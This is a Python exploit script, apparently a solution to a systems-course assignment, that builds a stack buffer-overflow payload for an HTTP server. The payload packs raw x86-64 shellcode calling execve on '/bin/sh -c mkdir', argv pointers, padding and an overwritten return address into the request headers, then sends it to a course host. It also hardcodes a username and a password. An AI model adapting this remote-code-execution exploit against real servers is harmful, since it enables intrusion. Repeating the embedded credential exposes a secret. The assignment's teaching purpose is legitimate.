import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET"

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

PORT = random.randint(10000, 10025)

USER = b"jnyamiak"
PASSWORD = b"36bb44bb7c"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"mkdir " + USER + b"\x00"]

# Code that exploits buffer overflow
EXPLOIT = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\xaa\x55\x58\x58\x48\xc7\xc2\xC2\x55\x58\x58\x0f\x05" 
#Offset: 0x585855aa
# Start of Garbage Array
BUFFER_START = 0x58585590

# Elements of char **argv (each of type char *)
FILENAME_STR_ADDRESS = to_bytes(BUFFER_START)
ARGV1_STR_ADDRESS = to_bytes(BUFFER_START + len(SCRIPT[0]))
ARGV2_STR_ADDRESS = to_bytes(BUFFER_START + len(SCRIPT[0]) + len(SCRIPT[1]))
# This is also the first (and only) element of char **envp
ARGV_NULL_TERMINATOR = to_bytes(0)

ADDRESS_BYTE_SIZE = 8

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
N = 1008 - len(SCRIPT[0]) - len(SCRIPT[1]) - len(SCRIPT[2]) - 4 * ADDRESS_BYTE_SIZE - len(EXPLOIT)
PADDING = b"\xff" * N

ADDRESS = to_bytes(BUFFER_START + len(SCRIPT[0]) + len(SCRIPT[1]) + len(SCRIPT[2]) + 4 * ADDRESS_BYTE_SIZE)

# The "exploit string" is what we send in as the headers
HEADERS = SCRIPT[0] + SCRIPT[1] + SCRIPT[2] + FILENAME_STR_ADDRESS + ARGV1_STR_ADDRESS \
 + ARGV2_STR_ADDRESS + ARGV_NULL_TERMINATOR + EXPLOIT + PADDING + ADDRESS

print("argv Offset: " + str(hex(BUFFER_START + len(SCRIPT[0]) + len(SCRIPT[1]) + len(SCRIPT[2]))))
print("envp Offset: " + str(hex(BUFFER_START + len(SCRIPT[0]) + len(SCRIPT[1]) + len(SCRIPT[2]) + 24)))

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b" HTTP/1.1\r\n" + HEADERS + b"\r\n\r\n" + PASSWORD
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
